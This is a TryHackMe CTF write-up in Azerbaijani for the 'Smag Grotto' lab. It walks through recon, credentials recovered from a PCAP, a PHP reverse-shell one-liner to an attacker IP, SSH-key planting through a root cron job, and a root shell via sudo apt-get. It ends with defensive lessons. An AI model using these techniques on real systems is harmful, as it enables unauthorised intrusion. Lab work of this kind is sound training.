# Smag Grotto CTF — Writeup (TryHackMe)
**Çətinlik:** Asan  
**Platforma:** TryHackMe  
**Room:** Smag Grotto  

---

## Hədəf Haqqında

Smag Grotto — veb təhlükəsizliyi, şəbəkə analizi və privilege escalation mövzularını əhatə edən CTF maşınıdır. Məqsəd: user və root flag-larını tapmaq.

---

## 1. Kəşfiyyat (Reconnaissance)

### Nmap Scan
```bash
nmap -sV -sC 10.80.177.90
```

**Açıq portlar:**
- `22` — SSH
- `80` — HTTP (Smag veb saytı)

---

## 2. Veb Saytın Araşdırılması

`http://10.80.177.90` açıldı. Sadə bir səhifə idi.

### Gobuster ilə Gizli Səhifələr
```bash
gobuster dir -u http://10.80.177.90 -w /usr/share/wordlists/dirb/common.txt
```

`/mail` qovluğu tapıldı → `http://10.80.177.90/mail`

### Mail Səhifəsinin Analizi

Mail səhifəsində 3 email var idi:

- `jake@smag.thm` → `uzi@smag.thm` — PCAP faylı göndərildi
- **Vacib:** `../aW1wb3J0YW50/dHJhY2Uy.pcap` — network trace faylı
- **Gizli BCC:** `trodd@smag.thm`
- **Subdomain:** `development.smag.thm`

---

## 3. PCAP Analizi

### PCAP Faylını Yüklə
```bash
wget http://10.80.177.90/aW1wb3J0YW50/dHJhY2Uy.pcap
```

### Wireshark ilə Aç
```bash
wireshark dHJhY2Uy.pcap
```

**HTTP POST /login.php** paketi tapıldı.

**Follow TCP Stream** ilə credential-lar görüldü:
```
username=helpdesk
password=cH4nG3M3_n0w
```

---

## 4. Development Subdomain

### /etc/hosts-a Əlavə Et
```bash
echo "10.80.177.90 smag.thm" >> /etc/hosts
echo "10.80.177.90 development.smag.thm" >> /etc/hosts
```

### Login
`http://development.smag.thm` açıldı → Login paneli

**Credentials:**
- Username: `helpdesk`
- Password: `cH4nG3M3_n0w`

Daxil olundu → **"Enter a command"** səhifəsi açıldı!

---

## 5. Reverse Shell (RCE)

### Kali-də Netcat Başlat
```bash
nc -lvnp 4444
```

### Command Box-da PHP Reverse Shell
```php
php -r '$sock=fsockopen("192.168.138.73",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

SEND → **Shell gəldi!**

### Terminal Səliqəsi
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl + Z
stty raw -echo; fg
export TERM=xterm
```

---

## 6. User Flag (Jake)

### Crontab Analizi
```bash
cat /etc/crontab
```

**Kritik sətir:**
```
* * * * * root /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

Root hər dəqiqə backup faylını jake-in `authorized_keys`-inə kopyalayır!

### SSH Key Exploit

**Kali-də yeni SSH key yarat:**
```bash
ssh-keygen -t rsa -f jake_key
cat jake_key.pub
```

**Reverse Shell-də backup faylını əvəz et:**
```bash
echo "KALI_PUBLIC_KEY" > /opt/.backups/jake_id_rsa.pub.backup
```

**1 dəqiqə gözlə**, sonra:
```bash
ssh -i jake_key jake@10.80.177.90
```

**Jake-in shellinə girdik!**

### User Flag
```bash
cat /home/jake/user.txt
```

🚩 **User flag əldə edildi!**

---

## 7. Privilege Escalation (Root Flag)

### Sudo Yoxla
```bash
sudo -l
```

**Nəticə:**
```
(ALL) NOPASSWD: /usr/bin/apt-get
```

Jake parols uz `apt-get` işlədə bilir!

### apt-get ilə Root

```bash
sudo apt-get changelog apt
```

Açılan pager-də:
```
!/bin/bash
```

**Enter** → **ROOT SHELL!**

### Root Flag
```bash
cat /root/root.txt
```

🚩 **Root flag əldə edildi!**

---

## 8. İstifadə Olunan Boşluqlar

| Boşluq | Təsvir |
|--------|--------|
| PCAP-da açıq credential | Şifrə HTTP üzərindən göndərilmişdi |
| RCE (Command Injection) | Development saytı əmrləri birbaşa işlədirdi |
| Yazıla bilən backup faylı | `/opt/.backups/jake_id_rsa.pub.backup` dəyişdirilə bilirdi |
| Təhlükəli Cron Job | Root hər dəqiqə backup-ı authorized_keys-ə kopyalayırdı |
| sudo apt-get | GTFOBins vasitəsilə root əldə edildi |

---

## 9. Öyrəndiklərimiz

- **Şifrələri HTTP üzərindən göndərmə** — HTTPS istifadə et
- **RCE-nin qarşısını al** — istifadəçi girişini heç vaxt birbaşa işlətmə
- **Backup fayllarının icazələrini yoxla** — yazıla bilən olmamalıdır
- **Cron job-ları diqqətlə yaz** — təhlükəli faylları kopyalamaqdan çəkin
- **sudo icazələrini məhdudlaşdır** — GTFOBins-dəki proqramlara sudo vermə

---

*TryHackMe — Smag Grotto Room tamamlandı! 🏁*
